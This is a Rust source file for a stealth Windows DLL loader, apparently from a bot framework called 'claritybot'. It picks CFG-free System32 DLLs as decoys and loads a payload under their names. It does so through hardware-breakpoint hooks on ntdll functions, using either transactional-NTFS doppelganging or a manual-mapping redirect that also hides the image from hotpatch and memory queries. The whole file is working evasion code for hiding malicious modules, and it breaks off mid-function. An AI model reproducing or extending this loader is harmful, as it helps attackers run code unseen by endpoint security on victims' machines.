#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(static_mut_refs)]

use std::{clone, collections::HashMap, default, env::home_dir, ffi::{OsStr, c_char}, fs, io, iter, mem::zeroed, ops::Index, os::windows::ffi::OsStrExt, process::exit, ptr, slice, str::Bytes, string, sync::{Arc, RwLock}, time::Duration};
use windows_sys::{
    Wdk::{Foundation::{NtClose, OBJECT_ATTRIBUTES}, Storage::FileSystem::{FILE_DIRECTORY_INFORMATION, FileDirectoryInformation, FileFullDirectoryInformation, MEMORY_INFORMATION_CLASS, NtCreateSection, NtOpenFile, NtQueryDirectoryFile, NtQueryInformationFile, NtQueryVirtualMemory}, System::{Memory::{NtMapViewOfSection, SECTION_INHERIT}, SystemServices::{MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, RtlGetVersion, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SECTION_MAP_WRITE}}}, Win32::{Foundation::{self, GetLastError, *}, Security::{GetTokenInformation, LookupAccountSidW, PSID, SECURITY_ATTRIBUTES, SID_AND_ATTRIBUTES, SID_NAME_USE, SidTypeUnknown, TOKEN_ACCESS_MASK, TOKEN_USER, TokenIntegrityLevel, TokenUser}, Storage::FileSystem::{CREATE_NEW, CreateFileW, CreateTransaction, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_BACKUP_SEMANTICS, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, GetFileSizeEx, GetFileVersionInfoSizeW, GetFileVersionInfoW, OPEN_ALWAYS, OPEN_EXISTING, VS_FIXEDFILEINFO, VS_VERSION_INFO, VerQueryValueW, WriteFile}, System::{Diagnostics::Debug::{AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS, GetThreadContext, IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, IMAGE_LOAD_CONFIG_CODE_INTEGRITY, IMAGE_LOAD_CONFIG_DIRECTORY64, RemoveVectoredExceptionHandler, SetThreadContext}, IO::IO_STATUS_BLOCK, LibraryLoader::{FindResourceW, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, GET_MODULE_HANDLE_EX_FLAG_PIN, GetModuleFileNameW, GetModuleHandleExW, GetModuleHandleW, GetProcAddress, LoadLibraryExW, LoadModule, LoadResource}, Memory::{LPTR, LocalAlloc, PAGE_PROTECTION_FLAGS, SEC_IMAGE, VirtualAlloc, VirtualProtect}, ProcessStatus::{GetModuleInformation, MODULEINFO}, SystemInformation::OSVERSIONINFOW, Threading::{CreateProcessW, GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOW, SetProtectedPolicy, Sleep}}, UI::WindowsAndMessaging::*}, core::{PCWSTR, *}
};

mod hwbp;
mod pe;

//https://ntdoc.m417z.com/hot_patch_information_class
enum HOT_PATCH_INFORMATION_CLASS {
    ManageHotPatchLoadPatch = 0, // MANAGE_HOT_PATCH_LOAD_PATCH
    ManageHotPatchUnloadPatch = 1, // MANAGE_HOT_PATCH_UNLOAD_PATCH
    ManageHotPatchQueryPatches = 2, // MANAGE_HOT_PATCH_QUERY_PATCHES
    ManageHotPatchLoadPatchForUser = 3, // MANAGE_HOT_PATCH_LOAD_PATCH
    ManageHotPatchUnloadPatchForUser = 4, // MANAGE_HOT_PATCH_UNLOAD_PATCH
    ManageHotPatchQueryPatchesForUser = 5, // MANAGE_HOT_PATCH_QUERY_PATCHES
    ManageHotPatchQueryActivePatches = 6, // MANAGE_HOT_PATCH_QUERY_ACTIVE_PATCHES
    ManageHotPatchApplyImagePatch = 7, // MANAGE_HOT_PATCH_APPLY_IMAGE_PATCH
    ManageHotPatchQuerySinglePatch = 8, // MANAGE_HOT_PATCH_QUERY_SINGLE_PATCH
    ManageHotPatchCheckEnabled = 9, // MANAGE_HOT_PATCH_CHECK_ENABLED
    ManageHotPatchCreatePatchSection = 10, // MANAGE_HOT_PATCH_CREATE_PATCH_SECTION
    ManageHotPatchMax
}

//must not have trailing path separator
static SEARCH_DIRECTORY:&str = r"C:\Windows\System32";

//enum contants for function
const SectionImageInformation:i32 = 1;
const ManageHotPatchQuerySinglePatch:u32 = 8;
const MemoryImageExtensionInformation:i32 = 14;

// data used by the manual mapping approach
static mut filesize: i64 = 0;
static mut module_base_address: *const core::ffi::c_void = std::ptr::null() as *const core::ffi::c_void;
static mut module_mapped_size: usize = 0;
static mut NtManageHotPatch_hwbp: hwbp::hook = hwbp::hook::new(0, 0);
static mut NtMapViewOfSection_hwbp: hwbp::hook = hwbp::hook::new(0, 0);
static mut NtQueryVirtualMemory_hwbp: hwbp::hook = hwbp::hook::new(0, 0);

//data used by the doppelganging approach
static mut decoy_module_name:String = String::new();
static mut my_module_bytes: Vec<u8> = Vec::new();
static mut redirectCreateSection:bool = false;
static mut NtOpenFile_hwbp: hwbp::hook = hwbp::hook::new(0, 0);
static mut NtCreateSection_hwbp: hwbp::hook = hwbp::hook::new(0, 0);

// Tracks decoy DLLs currently in use to prevent reuse
use std::sync::LazyLock;
use std::collections::HashSet;

use crate::hwbp::clear_all_hooks;

static DECOY_TRACKER: LazyLock<RwLock<HashSet<String>>> = LazyLock::new(|| {
    RwLock::new(HashSet::new())
});

/// Marks a decoy DLL as in-use
pub fn reserve_decoy(decoy_name: &str) -> bool {
    if let Ok(mut tracker) = DECOY_TRACKER.write() {
        tracker.insert(decoy_name.to_lowercase())
    } else {
        false
    }
}

/// Releases a decoy DLL so it can be reused
pub fn release_decoy(decoy_name: &str) -> bool {
    if let Ok(mut tracker) = DECOY_TRACKER.write() {
        tracker.remove(&decoy_name.to_lowercase())
    } else {
        false
    }
}

/// Checks if a decoy DLL is currently in use
pub fn is_decoy_in_use(decoy_name: &str) -> bool {
    if let Ok(tracker) = DECOY_TRACKER.read() {
        tracker.contains(&decoy_name.to_lowercase())
    } else {
        false
    }
}

/// Returns list of all decoys currently in use
pub fn get_decoys_in_use() -> Vec<String> {
    if let Ok(tracker) = DECOY_TRACKER.read() {
        tracker.iter().cloned().collect()
    } else {
        Vec::new()
    }
}

pub struct ModuleInfo {
    pub Module_name:String,
    pub Decoy_module:String,
    pub Load_method:method,
    pub Module_handle:usize,
}

#[repr(u8)]
pub enum function_type {
    builtin = 1,
    user    = 2,
    public  = 4,
}

// if a module wishes to receive information on functions they should export a function called receive. this function takes in a single argument that is an address to a internal claritybot function. this internal function should work like getprocaddress. but takes in the modulename and function name:
//GetInternalProc(name,function)

//claritybot should keep track of which modules are referencing which so modules don't get unloaded while still in use.

//there should also be a internal function to let the loader know when a module is done with a module. so if the count is zero then its safe to free.

//the function that exports a list of function structs should be called "register".

//make function to inspect and clear hardware breakpoints.

//only allow functions from this list to be called.
pub struct function {
    pub name: [u8;16], //have a static name length for simplicity.
    pub flags: u8,
    pub message_code:u16, //message code if the flags indicate its a builtin.
    pub address: usize,
}

pub unsafe fn loadlibrary(module_name:String,module_bytes:Vec<u8>,method: method) -> Result<ModuleInfo,String> {
    clear_all_hooks();
    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: starting for '{}', {} bytes", module_name, module_bytes.len());
    }

    my_module_bytes = module_bytes;
    
    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: searching for cfg-free images in System32...");
    }

    let images = cfg_free_images(SEARCH_DIRECTORY.to_string(),".dll".to_string(),my_module_bytes.len() as i64);

    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: found {} candidate decoy images", images.len());
    }

    if images.is_empty() {
        #[cfg(debug_assertions)]
        {
            println!("[DEBUG] loader::loadlibrary: ERROR - no suitable decoy images found!");
        }
        return Err("No suitable decoy DLL found".to_string());
    }

    decoy_module_name = images[0].clone();
    
    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: selected decoy = '{}'", decoy_module_name);
    }

    // Mark this decoy as in use
    reserve_decoy(&decoy_module_name);

    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: calling LoadLibraryRedirector with method {:?}...", match method { method::mm => "mm", method::tx => "tx" });
    }

    LoadLibraryRedirector(method.clone());

    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: LoadLibraryRedirector completed, calling LoadLibraryExW...");
    }

    let empty_handle:HANDLE = Default::default();
    let module_name_utf16:Vec<u16> = decoy_module_name.clone().encode_utf16().chain(iter::once(0)).collect();
    let module_handle = LoadLibraryExW(module_name_utf16.as_ptr(),empty_handle,0);

    clear_all_hooks();

    my_module_bytes = Vec::new();

    if module_handle as usize  == 0 {
        return Err("LoadLibraryW returned null handle".to_string());
    }

    #[cfg(debug_assertions)]
    {
        println!("[DEBUG] loader::loadlibrary: complete for '{}'", module_name);
    }

    Ok(ModuleInfo {
        Module_name: module_name,
        Decoy_module: decoy_module_name.clone(),
        Load_method: method,
        Module_handle: module_handle as usize,
    })
}

pub unsafe fn cfg_free_images(search_directory: String, extension:String, min_size:i64)  -> Vec<String> {
    let mut iostatus:IO_STATUS_BLOCK = Default::default();
    let mut image_paths: Vec<String> = Vec::new();
    let search_directory_utf16:Vec<u16>= search_directory.encode_utf16().chain(iter::once(0)).collect(); 
    let directory_handle =  CreateFileW(search_directory_utf16.as_ptr() as *const u16, GENERIC_READ, FILE_SHARE_READ, std::ptr::null_mut(),OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS, std::ptr::null_mut());
    if directory_handle == std::ptr::null_mut() {
        return image_paths
    }
    let mut size:u32 = 512;
    let mut repeat:bool = false;
    let mut buffer: Vec<u8>;
    loop {
        buffer = vec![0; size as usize];
        let status = NtQueryDirectoryFile(directory_handle,std::ptr::null_mut(),None,std::ptr::null(),&mut iostatus,buffer.as_mut_ptr() as *mut std::ffi::c_void,size,FileDirectoryInformation,false,std::ptr::null(),repeat);
        println!("{:x}",status);
        if repeat {
            break
        }
        if status == STATUS_NO_MORE_FILES {
            repeat = true;
            continue;
        }
        size = size * 2;
    }

    let mut offset:usize = 0;
    loop {
        let test = buffer.as_ptr().add(offset).cast::<FILE_DIRECTORY_INFORMATION>();
        let file_name = String::from_utf16(slice::from_raw_parts((*test).FileName.as_ptr(), (*test).FileNameLength as usize /2)).unwrap();
        if file_name.ends_with(&extension) && (min_size == 0 || (*test).EndOfFile > min_size){
            if is_decoy_in_use(&file_name) {
                if (*test).NextEntryOffset == 0 {
                    break
                }
                offset += (*test).NextEntryOffset as usize;
                continue;
            }
            let file_path = search_directory.clone() + "\\" + &file_name;
            match image_has_cfg(&file_path) {
                None => {},
                Some(v) => {
                    if v == false {
                        image_paths.push(file_name);
                    }
                }
            }
        }
        
        if (*test).NextEntryOffset == 0 {
            break
        }
        offset += (*test).NextEntryOffset as usize;
    }
    NtClose(directory_handle);
    image_paths
}


unsafe fn image_has_cfg(path: &String) -> Option<bool> {
    let module_bytes = fs::read(path).unwrap();
    let dos_header = module_bytes.as_ptr().cast::<pe::IMAGE_DOS_HEADER>();
    if (*dos_header).E_magic != 23117 { //MZ
        return None
    }
    
    // Get signature and file header which are common to both 32 and 64-bit
    let nt_header_base = module_bytes.as_ptr().add((*dos_header).E_lfanew as usize);
    let signature = *(nt_header_base as *const u32);
    if signature != 17744 { //PE
        return None
    }
    
    // Read the optional header magic to determine 32 vs 64-bit
    // Magic is at offset 24 from NT headers start (after 4-byte signature + 20-byte file header)
    let optional_header_magic = *(nt_header_base.add(24) as *const u16);
    
    const PE32_MAGIC: u16 = 0x10b;    // 32-bit
    const PE32PLUS_MAGIC: u16 = 0x20b; // 64-bit
    
    match optional_header_magic {
        PE32_MAGIC => {
            // 32-bit PE
            let nt_header = nt_header_base.cast::<pe::IMAGE_NT_HEADERS32>();
            let entry = &(*nt_header).OptionalHeader.IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG as usize];
            if entry.VirtualAddress == 0 {
                return Some(false)
            } else {
                match rva_to_file_offset_32(nt_header, entry.VirtualAddress) {
                    Some(offset) => {
                        let image_load_config = module_bytes.as_ptr().add(offset).cast::<pe::IMAGE_LOAD_CONFIG_DIRECTORY32>();
                        if (*image_load_config).GuardCFFunctionCount == 0 {
                            return Some(false)
                        }
                    },
                    None => {
                        return None;
                    }
                }
            }
            Some(true)
        },
        PE32PLUS_MAGIC => {
            // 64-bit PE
            let nt_header = nt_header_base.cast::<pe::IMAGE_NT_HEADERS64>();
            let entry = &(*nt_header).OptionalHeader.IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG as usize];
            if entry.VirtualAddress == 0 {
                return Some(false)
            } else {
                match rva_to_file_offset(nt_header, entry.VirtualAddress) {
                    Some(offset) => {
                        let image_load_config = module_bytes.as_ptr().add(offset).cast::<pe::IMAGE_LOAD_CONFIG_DIRECTORY64>();
                        if (*image_load_config).GuardCFFunctionCount == 0 {
                            return Some(false)
                        }
                    },
                    None => {
                        return None;
                    }
                }
            }
            Some(true)
        },
        _ => {
            // Unknown PE format
            None
        }
    }
}

fn rva_to_file_offset(nt_header: *const pe::IMAGE_NT_HEADERS64, rva: u32) -> Option<usize> {
    unsafe {
        let section_count = (*nt_header).FileHeader.NumberOfSections as usize;
        let first_section = (nt_header as *const u8)
            .add(size_of::<pe::IMAGE_NT_HEADERS64>())
            .cast::<pe::IMAGE_SECTION_HEADER>();
        
        for i in 0..section_count {
            let section = &*first_section.add(i);
            let start = section.VirtualAddress;
            let end = start + section.SizeOfRawData;
            if rva >= start && rva < end {
                return Some((rva - section.VirtualAddress + section.PointerToRawData) as usize);
            }
        }
        None
    }
}

fn rva_to_file_offset_32(nt_header: *const pe::IMAGE_NT_HEADERS32, rva: u32) -> Option<usize> {
    unsafe {
        let section_count = (*nt_header).FileHeader.NumberOfSections as usize;
        let first_section = (nt_header as *const u8)
            .add(size_of::<pe::IMAGE_NT_HEADERS32>())
            .cast::<pe::IMAGE_SECTION_HEADER>();
        
        for i in 0..section_count {
            let section = &*first_section.add(i);
            let start = section.VirtualAddress;
            let end = start + section.SizeOfRawData;
            if rva >= start && rva < end {
                return Some((rva - section.VirtualAddress + section.PointerToRawData) as usize);
            }
        }
        None
    }
}

#[derive(Clone,Copy)]
pub enum method {
    tx,
    mm,
}

fn LoadLibraryRedirector(method : method) {
    unsafe {
        #[cfg(debug_assertions)]
        println!("[DEBUG] LoadLibraryRedirector: verifying image...");

        if !VerifyImage(&my_module_bytes) {
            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: ERROR - image verification failed!");
            return
        }

        #[cfg(debug_assertions)]
        println!("[DEBUG] LoadLibraryRedirector: image verified, setting protected policy...");

        let mut original_security_policy: usize = Default::default();
        const POLICY: GUID = GUID{data1:0x1FC98BCA,data2:0x1BA9,data3:0x4397,data4:[0x93,0xF9,0x34,0x9E,0xAD,0x41,0xE0,0x57]};
        SetProtectedPolicy( &POLICY, 0,&mut original_security_policy);
        
        match method {
        method::tx => {
            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: using doppelganging (tx) method");

            NtCreateSection_hwbp = hwbp::hook::new(NtCreateSection as u64, NtCreateSectionHook as u64);
            NtCreateSection_hwbp.enable(true);
            NtOpenFile_hwbp = hwbp::hook::new(NtOpenFile as u64, NtOpenFileHook as u64);
            NtOpenFile_hwbp.enable(true);

            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: tx hooks enabled");
        },
        method::mm => {
            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: using manual_map (mm) method");

            let decoy_module_name_full_path = String::from(SEARCH_DIRECTORY.to_string()+r"\"+decoy_module_name.as_str());
            
            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: decoy full path = '{}'", decoy_module_name_full_path);

            let module_name_utf16:Vec<u16> = decoy_module_name_full_path.encode_utf16().chain(iter::once(0)).collect();
            let empty_handle: HANDLE = Default::default();
            let file_handle = CreateFileW(module_name_utf16.as_ptr() as *const u16,FILE_READ_ATTRIBUTES,0,std::ptr::null(),OPEN_ALWAYS,0,empty_handle);
            GetFileSizeEx(file_handle, &mut filesize);
            CloseHandle(file_handle);

            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: decoy file size = {}", filesize);

            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: calling MapModule...");

            MapModule(&my_module_bytes);

            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: MapModule complete, module_base_address = {:p}", module_base_address);

            let ntdll_handle  = GetModuleHandleW(w!("ntdll"));
            let version = get_module_version(ntdll_handle);
            
            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: ntdll version = {}.{}.{}", version.0, version.1, version.2);

            if ModuleIsx64(ntdll_handle)  && version.2 >= 26100 && HotPatchingEnabled() {
                #[cfg(debug_assertions)]
                println!("[DEBUG] LoadLibraryRedirector: setting up HotPatch hooks");

                #[cfg(debug_assertions)]
                println!("[DEBUG] enabling NtManageHotPatch hook");
                let NtManageHotPatch = GetProcAddress(ntdll_handle, s!("NtManageHotPatch")).unwrap();
                NtManageHotPatch_hwbp = hwbp::hook::new(NtManageHotPatch as u64,NtManageHotPatchHook as u64);
                NtManageHotPatch_hwbp.enable(true);

                #[cfg(debug_assertions)]
                println!("[DEBUG] enabling NtQueryVirtualMemory hook");

                NtQueryVirtualMemory_hwbp = hwbp::hook::new(NtQueryVirtualMemory as u64,NtQueryVirtualMemoryHook as u64);
                NtQueryVirtualMemory_hwbp.enable(true);
            }
            #[cfg(debug_assertions)]
            println!("[DEBUG] enabling ntmapviewofsection hook");

             NtMapViewOfSection_hwbp = hwbp::hook::new(NtMapViewOfSection as u64, NtMapViewOfSectionHook as u64);
             NtMapViewOfSection_hwbp.enable(true);

            #[cfg(debug_assertions)]
            println!("[DEBUG] LoadLibraryRedirector: mm hooks enabled");
        }
        }
    }
}

unsafe fn VerifyImage(pebytes: &Vec<u8>) -> bool {
    let dos_header = pebytes.as_ptr().cast::<pe::IMAGE_DOS_HEADER>();
    if (*dos_header).E_magic != 23117 { //MZ
        return false
    }
    let nt_header = pebytes.as_ptr().add((*dos_header).E_lfanew as usize).cast::<pe::IMAGE_NT_HEADERS64>();
    if (*nt_header).Signature != 17744 { //PE
        return false
    }
    if (*nt_header).FileHeader.Machine != 34404 { //AMD64
        return false
    }
    if (*nt_header).OptionalHeader.Magic != 523 { //Nt64
        return false
    }
    true
}

unsafe fn MapModule(pebytes: &Vec<u8>) {
    let dos_header = pebytes.as_ptr().cast::<pe::IMAGE_DOS_HEADER>();
    let nt_header = pebytes.as_ptr().add((*dos_header).E_lfanew as usize).cast::<pe::IMAGE_NT_HEADERS64>();

    module_base_address = VirtualAlloc(std::ptr::null(),(*nt_header).OptionalHeader.SizeOfImage as usize,MEM_COMMIT,PAGE_READWRITE);
    module_mapped_size = (*nt_header).OptionalHeader.SizeOfImage as usize;
    let sizeofheaders:usize =  (*nt_header).OptionalHeader.SizeOfHeaders as usize;

    std::ptr::copy(pebytes.as_ptr(),module_base_address as *mut u8,sizeofheaders);
    VirtualProtect(module_base_address, sizeofheaders, PAGE_READONLY,std::ptr::null_mut::<PAGE_PROTECTION_FLAGS>());

    let base_of_section_arr = (*dos_header).E_lfanew as usize + 264;
    let numberOfSections =  (*nt_header).FileHeader.NumberOfSections;
    for i in 0..numberOfSections {
        let section_arr_index:usize = base_of_section_arr + (i as usize * 40);
        let section = pebytes.as_ptr().add(section_arr_index).cast::<pe::IMAGE_SECTION_HEADER>();
        let pointerToRawData = (*section).PointerToRawData as usize;
        if pointerToRawData != 0 {
            let section_virtual_address = module_base_address.add((*section).VirtualAddress as usize);
            std::ptr::copy(pebytes.as_ptr().add(pointerToRawData),section_virtual_address as *mut u8,(*section).SizeOfRawData as usize);
            VirtualProtect(section_virtual_address,(*section).Misc.VirtualSize as usize,get_protection((*section).Characteristics),std::ptr::null_mut::<PAGE_PROTECTION_FLAGS>());
        }
    }
}

pub fn get_protection(characteristics: u32) -> u32 {
    let exec  = (characteristics & pe::IMAGE_SCN_MEM_EXECUTE) != 0;
    let read  = (characteristics & pe::IMAGE_SCN_MEM_READ)    != 0;
    let write = (characteristics & pe::IMAGE_SCN_MEM_WRITE)   != 0;

    match (exec, read, write) {
        (true,  true,  true)  => PAGE_EXECUTE_READWRITE,
        (true,  true,  false) => PAGE_EXECUTE_READ,
        (true,  false, true)  => PAGE_EXECUTE_WRITECOPY,
        (true,  false, false) => PAGE_EXECUTE,
        (false, true,  true)  => PAGE_READWRITE,
        (false, true,  false) => PAGE_READONLY,
        (false, false, true)  => PAGE_WRITECOPY,
        (false, false, false) => PAGE_NOACCESS,
    }
}

pub fn get_module_version(hmodule: HMODULE) -> (u16, u16, u16, u16) {
    unsafe {
        let mut path_buf = [0u16; 260];
        let len = GetModuleFileNameW(hmodule, &mut path_buf[0],260);
        let path = &path_buf[..len as usize];

        let mut dummy: u32 = 0;
        let size = GetFileVersionInfoSizeW(path.as_ptr(), &mut dummy);

        let mut data = vec![0u8; size as usize];
        GetFileVersionInfoW(path.as_ptr(), 0, size, data.as_mut_ptr() as _);

        let mut ffi_ptr: *mut VS_FIXEDFILEINFO = ptr::null_mut();
        let mut ffi_len: u32 = 0;

        let ok = VerQueryValueW(
            data.as_ptr() as _,
            w!("\\"),
            &mut ffi_ptr as *mut _ as _,
            &mut ffi_len,
        );
        

        let ffi: &VS_FIXEDFILEINFO = &*ffi_ptr;
        let hi = |d: u32| (d >> 16) as u16;
        let lo = |d: u32| (d & 0xFFFF) as u16;
        let major = hi(ffi.dwFileVersionMS);
        let minor = lo(ffi.dwFileVersionMS);
        let patch = hi(ffi.dwFileVersionLS);
        let build = lo(ffi.dwFileVersionLS);

        (major, minor, patch, build)
    }
}

unsafe fn ModuleIsx64(module: HANDLE) -> bool {
    let mut moduleinfo:MODULEINFO = Default::default();
    GetModuleInformation(GetCurrentProcess(),module,&mut moduleinfo,size_of::<MODULEINFO>() as u32);
    let pebytes: &[u8] = slice::from_raw_parts(moduleinfo.lpBaseOfDll as *const u8, moduleinfo.SizeOfImage as usize);
    let dos_header = pebytes.as_ptr().cast::<pe::IMAGE_DOS_HEADER>();
    if (*dos_header).E_magic != 23117 { //MZ
        return false
    }

    let nt_header = pebytes.as_ptr().add((*dos_header).E_lfanew as usize).cast::<pe::IMAGE_NT_HEADERS64>();
    if (*nt_header).Signature != 17744 { //PE
        return false
    }
    if (*nt_header).FileHeader.Machine != 34404 { //AMD64
        return false
    }
    true
}

#[repr(C, packed)]
struct MANAGE_HOT_PATCH_ENABLED {
    Version:u32,
    Flags:u32,
}

unsafe fn HotPatchingEnabled() -> bool {
    let ntdll_handle  = GetModuleHandleW(w!("ntdll"));
    let NtManageHotPatch: extern "system" fn(usize,usize,usize,usize) -> usize = std::mem::transmute(GetProcAddress(ntdll_handle,s!("NtManageHotPatch")).unwrap() as *const ());
    let mut information:MANAGE_HOT_PATCH_ENABLED = MANAGE_HOT_PATCH_ENABLED { Version: 1, Flags: 0 };
    let mut rlen:u32 = 0;
    let status = NtManageHotPatch(HOT_PATCH_INFORMATION_CLASS::ManageHotPatchCheckEnabled as usize,&mut information as *mut _ as usize,size_of::<MANAGE_HOT_PATCH_ENABLED>() as usize,&mut rlen as *mut _ as usize);
    if status != STATUS_NOT_IMPLEMENTED as usize && status != STATUS_NOT_SUPPORTED as usize {
        return true;
    }
    false
}

#[unsafe(no_mangle)]
unsafe extern "system" fn NtCreateSectionHook(sectionhandle: *mut HANDLE, desiredaccess: u32, objectattributes: *const OBJECT_ATTRIBUTES, maximumsize: *const i64, sectionpageprotection: u32, allocationattributes: u32, filehandle: HANDLE) -> Foundation::NTSTATUS {
    NtCreateSection_hwbp.disable();
    let mut status: NTSTATUS = 0;
    if redirectCreateSection {
        status = NtCreateSection(sectionhandle, SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE,std::ptr::null_mut(), 0 as *const i64, PAGE_READONLY, SEC_IMAGE, filehandle);
    } else {
        status = NtCreateSection(sectionhandle, desiredaccess, objectattributes, maximumsize, sectionpageprotection, allocationattributes, filehandle);
        NtCreateSection_hwbp.enable(true);
    }
    status
}

#[unsafe(no_mangle)]
unsafe extern "system" fn NtOpenFileHook(filehandle : *mut HANDLE, desiredaccess : u32, objectattributes : *const OBJECT_ATTRIBUTES, iostatusblock : *mut IO_STATUS_BLOCK, shareaccess : u32, openoptions : u32) -> NTSTATUS {
    NtOpenFile_hwbp.disable();
    let status: NTSTATUS = 0;
    let mut file_name_matches:bool = Default::default();
    let this_module = String::from_utf16(slice::from_raw_parts((*(*objectattributes).ObjectName).Buffer,(*(*objectattributes).ObjectName).Length as usize / 2)).unwrap_or(String::from(""));
    
    if this_module.trim().contains(decoy_module_name.trim()) {
        file_name_matches = true;
    }

    if file_name_matches {
       let transaction_handle = CreateTransaction(std::ptr::null_mut() as *mut SECURITY_ATTRIBUTES,
        std::ptr::null_mut() as *mut  GUID,
        0,
        0,
        0,
        0,
        std::ptr::null());


        let ntdll_addr = GetModuleHandleW(w!("ntdll"));
        let RtlSetCurrentTransaction: extern "system" fn(usize) -> usize = std::mem::transmute(GetProcAddress(ntdll_addr,s!("RtlSetCurrentTransaction")).unwrap() as *const ());
        RtlSetCurrentTransaction(transaction_handle as usize);

        let this_module_w:Vec<u16> = decoy_module_name.trim().encode_utf16().chain(iter::once(0)).collect();

        let mut module_file_handle = CreateFileW(this_module_w.as_ptr() as *const u16,GENERIC_WRITE,FILE_SHARE_READ,std::ptr::null(),CREATE_NEW,FILE_ATTRIBUTE_NORMAL,std::ptr::null_mut());
        if module_file_handle == INVALID_HANDLE_VALUE {
            module_file_handle = CreateFileW(this_module_w.as_ptr() as *const u16,GENERIC_WRITE,FILE_SHARE_READ,std::ptr::null(),OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,std::ptr::null_mut());
        }

        let mut totalBytesWritten:u32 = 0;
        let mut lastWriteSucceeded: windows_sys::core::BOOL = 0;
        loop {
            let mut bytesWritten: u32 = 0;
            lastWriteSucceeded = WriteFile(module_file_handle, &my_module_bytes[totalBytesWritten as usize], (my_module_bytes.len() as u32) - totalBytesWritten, &mut bytesWritten, std::ptr::null_mut());
            totalBytesWritten += bytesWritten;
            if totalBytesWritten >= my_module_bytes.len() as u32 && lastWriteSucceeded != 0 {
                break
            }
        }
        CloseHandle(module_file_handle);
        *filehandle = CreateFileW(this_module_w.as_ptr() as *const u16,GENERIC_READ,shareaccess,std::ptr::null(),OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,std::ptr::null_mut());
        redirectCreateSection = true;
    } else {
        let status = NtOpenFile(filehandle, desiredaccess, objectattributes, iostatusblock, shareaccess, openoptions);
        NtOpenFile_hwbp.enable(true);
    }
    status
}


#[unsafe(no_mangle)]
unsafe extern "system" fn NtQueryVirtualMemoryHook(processhandle : HANDLE, baseaddress : *const core::ffi::c_void, memoryinformationclass : MEMORY_INFORMATION_CLASS, memoryinformation : *mut core::ffi::c_void, memoryinformationlength : usize, returnlength : *mut usize) -> NTSTATUS {
    NtQueryVirtualMemory_hwbp.disable();
    let status:NTSTATUS;
    if baseaddress == module_base_address && memoryinformationclass == MemoryImageExtensionInformation {
        NtQueryVirtualMemory_hwbp.enable(true);
        status = STATUS_NOT_SUPPORTED as i32;
    } else {
        status = NtQueryVirtualMemory(processhandle, baseaddress, memoryinformationclass, memoryinformation, memoryinformationlength, returnlength);
        NtQueryVirtualMemory_hwbp.enable(true);
    }
    status
}

#[unsafe(no_mangle)]
unsafe extern "system" fn NtMapViewOfSectionHook(sectionhandle : HANDLE, processhandle : HANDLE, baseaddress : *mut *mut core::ffi::c_void, zerobits : usize, commitsize : usize, sectionoffset : *mut i64, viewsize : *mut usize, inheritdisposition : SECTION_INHERIT, allocationtype : u32, win32protect : u32) -> NTSTATUS {
    let mut status:NTSTATUS;
    let mut information: pe::SECTION_IMAGE_INFORMATION = Default::default();
    let mut length:usize = 0 ;
    let ntdll_handle  = GetModuleHandleW(w!("ntdll"));
    let NtQuerySection: extern "system" fn(usize,usize,usize,usize,usize) -> usize = std::mem::transmute(GetProcAddress(ntdll_handle,s!("NtQuerySection")).unwrap() as *const ());
    status = NtQuerySection(sectionhandle as usize,SectionImageInformation as usize,&mut information as *mut _ as usize,size_of::<pe::SECTION_IMAGE_INFORMATION>(),&mut length as *mut _ as usize) as NTSTATUS;
    if status == 0  && information.ImageFileSize == filesize as u32 {
        *baseaddress = module_base_address as *mut _;
        *viewsize = module_mapped_size;
        return STATUS_IMAGE_NOT_AT_BASE as i32;
    }
    NtMapViewOfSection_hwbp.disable();
    status =  NtMapViewOfSection(sectionhandle, processhandle, baseaddress, zerobits, commitsize, sectionoffset, viewsize, inheritdisposition, allocationtype, win32protect);
    NtMapViewOfSection_hwbp.enable(true);
    status
}

//https://ntdoc.m417z.com/ntmanagehotpatch
#[unsafe(no_mangle)]
unsafe extern "system" fn NtManageHotPatchHook(HotPatchInformationClass : u32, HotPatchInformation : *mut core::ffi::c_void, HotPatchInformationLength : u32, ReturnLength : *mut u32) -> NTSTATUS {
    NtManageHotPatch_hwbp.disable();
    let ntdll_handle  = GetModuleHandleW(w!("ntdll"));
